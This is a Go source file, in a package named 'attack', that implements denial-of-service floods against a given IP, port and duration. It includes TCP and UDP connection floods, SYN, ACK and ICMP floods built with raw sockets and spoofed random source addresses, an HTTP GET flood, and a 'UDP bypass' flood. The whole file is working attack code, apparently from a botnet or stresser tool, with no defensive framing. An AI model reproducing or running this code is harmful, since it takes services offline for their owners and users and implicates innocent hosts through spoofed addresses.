package attack

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	myhttp "net/http"
	"strconv"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func randomIPv4Address() net.IP {
	// Seed the random number generator
	seed := time.Now().UnixNano()
	r := rand.New(rand.NewSource(seed))

	return net.IPv4(
		byte(r.Intn(256)),
		byte(r.Intn(256)),
		byte(r.Intn(256)),
		byte(r.Intn(256)),
	)
}

// random packets
func generate_random_string(length int) string {
	characters := "0123456789abcdefghijklmnopqrstuvwxyz"
	random_string := ""
	for i := 0; i < length; i++ {
		random_string += fmt.Sprintf("%c", characters[rand.Intn(len(characters))])
	}
	return random_string
}

// tcp flood
func TCP(ip string, port string, dur string) {
	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println(err)
		return
	}

	end := time.Now().Add(time.Duration(newdur) * time.Second)
	for time.Now().Before(end) {
		tcp_socket, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
		_, err := tcp_socket.Write([]byte(generate_random_string(1000)))
		if err != nil {
			fmt.Println(err)
		}
		tcp_socket.Close()
	}
}

// udp flood
func UDP(ip string, port string, dur string) {
	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println(err)
		return
	}

	end := time.Now().Add(time.Duration(newdur) * time.Second)
	for time.Now().Before(end) {
		udp_socket, _ := net.Dial("udp", fmt.Sprintf("%s:%s", ip, port))
		_, err := udp_socket.Write([]byte(generate_random_string(1000)))
		if err != nil {
			fmt.Println(err)
		}
		udp_socket.Close()
	}
}

// syn flood
func SYN(ip string, port string, dur string) {
	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println("Duration conversion error:", err)
		return
	}

	newport, err := strconv.Atoi(port)
	if err != nil {
		log.Println("Port conversion error:", err)
		return
	}

	dstIP := net.ParseIP(ip)
	if dstIP == nil {
		log.Println("Invalid IP address")
		return
	}

	// Open a raw socket
	conn, err := net.DialIP("ip4:tcp", nil, &net.IPAddr{IP: net.IPv4(0, 0, 0, 0)})
	if err != nil {
		log.Fatal("DialIP error:", err)
	}
	defer conn.Close()

	end := time.Now().Add(time.Duration(newdur) * time.Second)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	for time.Now().Before(end) {
		// Create a TCP layer with random source port for each packet
		srcPort := layers.TCPPort(r.Intn(65535-1024) + 1024)
		tcpLayer := &layers.TCP{
			SrcPort: srcPort,
			DstPort: layers.TCPPort(newport),
			SYN:     true,
			Seq:     r.Uint32(),
			Window:  14600,
		}

		ipLayer := &layers.IPv4{
			SrcIP:    randomIPv4Address(),
			DstIP:    dstIP,
			Protocol: layers.IPProtocolTCP,
		}

		// Set the TCP layer to compute the checksum with the context of the IPv4 layer
		tcpLayer.SetNetworkLayerForChecksum(ipLayer)

		// Serialize layers and create packet
		packet := gopacket.NewSerializeBuffer()
		options := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}
		err = gopacket.SerializeLayers(packet, options, ipLayer, tcpLayer)
		if err != nil {
			log.Println("SerializeLayers error:", err)
			continue
		}

		// Send packet
		if _, err := conn.Write(packet.Bytes()); err != nil {
			log.Println("Error sending packet:", err)
			continue
		}
	}
}

func ACK(ip string, port string, dur string) {
	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println("Duration conversion error:", err)
		return
	}

	newport, err := strconv.Atoi(port)
	if err != nil {
		log.Println("Port conversion error:", err)
		return
	}

	dstIP := net.ParseIP(ip)
	if dstIP == nil {
		log.Println("Invalid IP address")
		return
	}

	// Open a raw socket
	conn, err := net.DialIP("ip4:tcp", nil, &net.IPAddr{IP: net.IPv4(0, 0, 0, 0)})
	if err != nil {
		log.Fatal("DialIP error:", err)
	}
	defer conn.Close()

	end := time.Now().Add(time.Duration(newdur) * time.Second)
	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	for time.Now().Before(end) {
		// Create a TCP layer with random source port for each packet
		srcPort := layers.TCPPort(r.Intn(65535-1024) + 1024)
		tcpLayer := &layers.TCP{
			SrcPort: srcPort,
			DstPort: layers.TCPPort(newport),
			ACK:     true,
			Seq:     r.Uint32(),
			Window:  14600,
		}

		ipLayer := &layers.IPv4{
			SrcIP:    randomIPv4Address(),
			DstIP:    dstIP,
			Protocol: layers.IPProtocolTCP,
		}

		// Set the TCP layer to compute the checksum with the context of the IPv4 layer
		tcpLayer.SetNetworkLayerForChecksum(ipLayer)

		// Serialize layers and create packet
		packet := gopacket.NewSerializeBuffer()
		options := gopacket.SerializeOptions{
			FixLengths:       true,
			ComputeChecksums: true,
		}
		err = gopacket.SerializeLayers(packet, options, ipLayer, tcpLayer)
		if err != nil {
			log.Println("SerializeLayers error:", err)
			continue
		}

		// Send packet
		if _, err := conn.Write(packet.Bytes()); err != nil {
			log.Println("Error sending packet:", err)
			continue
		}
	}
}

func ICMP(ip string, dur string) {
	dstIP := net.ParseIP(ip) // Example IP address for ICMP destination

	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println(err)
		return
	}

	if dstIP == nil {
		log.Println("Invalid IP address")
		return
	}

	ipLayer := &layers.IPv4{
		SrcIP:    randomIPv4Address(),
		DstIP:    dstIP,
		Protocol: layers.IPProtocolICMPv4,
	}

	icmpLayer := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
	}

	packet := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(packet, options, ipLayer, icmpLayer)

	if err != nil {
		log.Println(err)
		return
	}

	// Open a raw socket
	conn, err := net.DialIP("ip4:icmp", nil, &net.IPAddr{IP: net.IPv4(0, 0, 0, 0)})
	if err != nil {
		log.Println(err)
		return
	}
	defer conn.Close()

	// Send the ICMP packet

	end := time.Now().Add(time.Duration(newdur) * time.Second)

	for time.Now().Before(end) {
		conn.Write(packet.Bytes())
	}
}

// http Get flood
func HTTP(target string, port string, dur string) {
	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println(err)
		return
	}

	start_time := time.Now()
	timeout := start_time.Add(time.Duration(newdur) * time.Second)
	for time.Now().Before(timeout) {
		_, _ = myhttp.Get(fmt.Sprintf("%s:%s", target, port))
	}
}

// UDP bypass
func UDP_VIP(target string, port string, dur string) {
	newdur, err := strconv.Atoi(dur)
	if err != nil {
		log.Println(err)
	}

	data := []byte{0x13, 0x37, 0xca, 0xfe, 0x01, 0x00, 0x00, 0x00}
	end_time := time.Now().Add(time.Duration(newdur) * time.Second)
	for time.Now().Before(end_time) {
		conn, err := net.Dial("udp", fmt.Sprintf("%s:%s", target, port))
		if err != nil {
			break
		}
		conn.Write(data)
	}
}
